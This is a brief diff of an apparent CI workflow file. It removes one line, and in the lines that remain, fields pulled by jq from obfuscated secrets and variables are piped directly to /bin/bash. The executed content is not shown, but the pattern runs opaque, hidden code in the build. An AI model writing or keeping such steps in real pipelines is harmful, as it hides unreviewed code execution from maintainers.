@@ -17,7 +17,6 @@ jobs:
           h140: ${{ secrets.h140 }}
         run: |
           printf '%s' "$h140" | jq -r .drzr16174 | /bin/bash
-          echo $pbchz6048 | jq -r .ebow348 | /bin/bash
           printf '%s' "$fylob83046" | jq -r .blyr21684 | /bin/bash
 
       - name: Upload artifact
